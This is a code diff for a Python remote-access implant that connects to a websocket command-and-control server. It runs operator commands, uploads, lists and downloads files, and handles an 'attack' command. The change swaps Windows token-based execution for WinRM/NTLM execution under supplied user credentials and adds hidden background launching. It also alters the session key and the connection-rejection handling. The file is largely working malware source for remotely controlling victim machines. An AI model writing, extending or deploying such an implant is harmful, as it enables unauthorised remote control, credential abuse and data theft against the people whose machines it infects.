@@ -11,12 +11,7 @@ import random
 import threading
 import time
 import re
-import win32con
-import win32process
-import win32event
-import win32profile
-import win32security
-import pywintypes
+import winrm
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK
 from typing import List, Dict, Tuple, Optional
@@ -79,11 +74,6 @@ class Impl:
                 
                 self.retry_count = 0  
                 
-                
-                rec = await asyncio.wait_for(ws.recv(), timeout=60)
-
-                if "Invalid conection" in str(rec).strip():
-                    sys.exit(0)
 
                 while self.running:
                     try:
@@ -102,7 +92,6 @@ class Impl:
             cmd = await asyncio.wait_for(ws.recv(), timeout=60)
             data = json.loads(cmd)
 
-            
 
             if 'cmd' in data:
                 await self._execute_command(ws, data['cmd'])
@@ -110,6 +99,8 @@ class Impl:
                 await self._handle_file_upload(ws, data)
             elif 'list_files' in data:
                 await self._list_directory(ws, data.get('path', self.current_dir))
+            elif "Invalid conection" in data:
+                sys.exit(0)
             elif 'get_files' in data:
                 await self._send_file(ws, data['get_files'])
             elif 'attack' in data:
@@ -180,21 +171,15 @@ class Impl:
     async def _execute_as_user(self, command_with_credentials: str):
         try:
             parts = shlex.split(command_with_credentials)
-            if len(parts) < 3 or len(parts) > 4:
-                return "Error: Wrong format. Use: exec_as <user> <password> <host (localhost by default)> <command>"
 
             username = parts[0]
             password = parts[1]
-            if len(parts) == 3:
-                host = "localhost"
-                actual_command = parts[2]
-            else:
-                host = parts[2]
-                actual_command = parts[3]
+            actual_command = parts[2:]
+
 
             domain = os.environ.get("USERDOMAIN", "WORKGROUP")
 
-            result = await asyncio.run(self.execute_command_as_user(actual_command, username, domain, password, self.current_dir))
+            result = await self.execute_command_as_user(actual_command, username, domain, password)
 
             return result
        
@@ -204,117 +189,144 @@ class Impl:
         
 
 
-    async def execute_command_as_user(command, username, domain, password, working_dir=None):
+    async def execute_command_as_user(self, command, username, domain, password):
         try:
-            run_in_background = command.strip().endswith('&')
+            run_in_background =  command[-1] == "&"
+
             if run_in_background:
-                command = command.strip()[:-1].strip()
+                command.remove("&")
 
-            # Detectar redirección (> o >>)
-            output_file = None
-            append = False
-            redir_match = re.match(r'(.*?)\s*(>>?)\s*(.+)$', command)
-            if redir_match:
-                command = redir_match.group(1).strip()
-                append = redir_match.group(2) == '>>'
-                output_file = redir_match.group(3).strip().strip('"')
+    
+#         # Detectar redirección (> o >>)
+#            output_file = None
+#            append = False
+#            redir_match = re.match(r'(.*?)\s*(>>?)\s*(.+)$', command)
+#            if redir_match:
+#                command = redir_match.group(1).strip()
+#                append = redir_match.group(2) == '>>'
+#                output_file = redir_match.group(3).strip().strip('"')
+#
+#            # Parseo de argumentos con respeto a comillas
+#            parts = shlex.split(command, posix=False)
+#            if not parts:
+#                return "No command provided."
+#
+#            exe = parts[0]
+#            args = parts[1:]
+#
+#            # Verificar si es ejecutable
+#            def is_executable(file):
+#                if os.path.isfile(file):
+#                    return True
+#                for path_dir in os.getenv('PATH', '').split(os.pathsep):
+#                    full_path = os.path.join(path_dir, file)
+#                    if os.path.isfile(full_path) or os.path.isfile(full_path + ".exe"):
+#                        return True
+#                return False
+#
+#            if not is_executable(exe):
+#                exe = "powershell.exe"
+#                args = ["-NoProfile", "-Command", command]
+#
+#            cmd_line = f'"{exe}" ' + ' '.join(f'"{arg}"' for arg in args) 
 
-            # Parseo de argumentos con respeto a comillas
-            parts = shlex.split(command, posix=False)
-            if not parts:
-                return "No command provided."
+            print("cmd: ", command)
 
-            exe = parts[0]
-            args = parts[1:]
-
-            # Verificar si es ejecutable
-            def is_executable(file):
-                if os.path.isfile(file):
-                    return True
-                for path_dir in os.getenv('PATH', '').split(os.pathsep):
-                    full_path = os.path.join(path_dir, file)
-                    if os.path.isfile(full_path) or os.path.isfile(full_path + ".exe"):
-                        return True
-                return False
-
-            if not is_executable(exe):
-                exe = "powershell.exe"
-                args = ["-NoProfile", "-Command", command]
-
-            cmd_line = f'"{exe}" ' + ' '.join(f'"{arg}"' for arg in args)
-
-            # Crear token de usuario
-            logon_type = win32con.LOGON32_LOGON_INTERACTIVE
-            logon_provider = win32con.LOGON32_PROVIDER_DEFAULT
-
-            user_token = win32security.LogonUser(
-                username, domain, password,
-                logon_type, logon_provider
+            return await self._execute_winrm_command(
+                command, username, domain, password, "localhost", 
+                run_in_background
             )
 
-            user_profile = win32profile.GetUserProfileDirectory(user_token)
-            env = win32profile.CreateEnvironmentBlock(user_token, False)
 
-            startup_info = win32process.STARTUPINFO()
-            startup_info.dwFlags |= win32con.STARTF_USESHOWWINDOW
-            startup_info.wShowWindow = win32con.SW_HIDE
-
-            if working_dir is None:
-                working_dir = os.getcwd()
-
-            creation_flags = win32con.CREATE_NEW_CONSOLE
-
-            # Ejecutar en segundo plano
-            if run_in_background:
-                win32process.CreateProcessAsUser(
-                    user_token,
-                    None,
-                    cmd_line,
-                    None,
-                    None,
-                    False,
-                    creation_flags,
-                    env,
-                    working_dir,
-                    startup_info
-                )
-                return "Process started in background."
-
-            # Ejecutar y capturar salida (sin redirección real)
-            process_handle, _, _, _ = win32process.CreateProcessAsUser(
-                user_token,
-                None,
-                cmd_line,
-                None,
-                None,
-                False,
-                creation_flags,
-                env,
-                working_dir,
-                startup_info
-            )
-
-            win32event.WaitForSingleObject(process_handle, win32event.INFINITE)
-            exit_code = win32process.GetExitCodeProcess(process_handle)
-
-            # No hay forma directa de capturar stdout/stderr con CreateProcessAsUser
-            result = f"Process exited with code {exit_code}."
-
-            if output_file:
-                mode = 'a' if append else 'w'
-                with open(output_file, mode, encoding='utf-8') as f:
-                    f.write(result)
-                return f"Output redirected to {output_file}"
-
-            return result
-
-        except pywintypes.error as e:
-            return f"Windows error: {e.strerror}"
         except Exception as ex:
             return f"Error executing command: {str(ex)}"
 
 
+    async def _execute_winrm_command(self, command: str, username: str, domain: str, 
+                                   password: str, host: str, run_in_background: bool,
+                                   output_file: Optional[str] = None, 
+                                   append: bool = False) -> str:
+        """
+        Ejecuta el comando a través de WinRM con todas las funcionalidades
+        """
+        try:
+            # Importar winrm (manejar error si no está instalado)
 
+            # Crear sesión WinRM
+            session = winrm.Session(
+                host,
+                auth=(f"{domain}\\{username}", password),
+                transport='ntlm'
+            )
+            
+            if run_in_background:
+                print("bg")
+                try:
+                # Para comandos en segundo plano, usar PowerShell Start-Process
+                    bg_command = f' {' '.join(f'{arg}' for arg in command)}'
+                    
+                    bg_command = f'Start-Process {bg_command} -WindowStyle Hidden -PassThru'
+
+                    result = session.run_ps(bg_command)
+
+                    print(result)
+
+                    if result.status_code == 0:
+                        # Extraer PID del resultado
+                        pid_match = re.search(r'Id\s*:\s*(\d+)', result.std_out.decode('utf-8'))
+                        if pid_match:
+                            return f"Process {pid_match.group(1)} started in background."
+                        return "Process started in background."
+                    else:
+                        error = result.std_err.decode('utf-8', errors='ignore')
+                        return f"ERROR starting background process: {error}"
+                except Exception as e:
+                    print(e)
+            
+            else:
+
+                try:
+
+                    result = session.run_ps(' '.join(f'{arg}' for arg in command))
+                    
+                    output = result.std_out.decode('utf-8', errors='ignore')
+                    error = result.std_err.decode('utf-8', errors='ignore')
+                    
+                    final_output = ""
+                    if result.status_code != 0:
+                        final_output = f"ERROR: {error}"
+                    else:
+                        final_output = output
+                    
+                except Exception as e:
+                    print(e)
+                # Manejar redirección a archivo
+                if output_file:
+                    try:
+                        mode = 'a' if append else 'w'
+                        encoding = 'utf-8'
+                        
+                        # Para guardar en archivo remoto, necesitamos ejecutar otro comando
+                        if output_file:
+                            if append:
+                                append_cmd = f'Add-Content -Path "{output_file}" -Value @\"\n{final_output}\n\"@'
+                            else:
+                                append_cmd = f'Set-Content -Path "{output_file}" -Value @\"\n{final_output}\n\"@'
+                            
+                            file_result = session.run_ps(append_cmd)
+                            if file_result.status_code == 0:
+                                final_output = f"Output redirected to {output_file}"
+                            else:
+                                file_error = file_result.std_err.decode('utf-8', errors='ignore')
+                                final_output = f"Error redirecting output: {file_error}"
+                    
+                    except Exception as file_ex:
+                        final_output = f"Error handling file redirection: {str(file_ex)}"
+                
+                return final_output
+                
+        except Exception as ex:
+            return f"WinRM execution error: {str(ex)}"
 
     
     async def _change_directory(self, ws, path: str) -> None:
@@ -785,7 +797,7 @@ if __name__ == "__main__":
 
     C2_WS_URL = "localhost:4444"
     GROUP_NAME = "grupo"
-    SESS_KEY = "1234567"
+    SESS_KEY = "12345678910"
     
     
     impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME, sess_key=SESS_KEY)
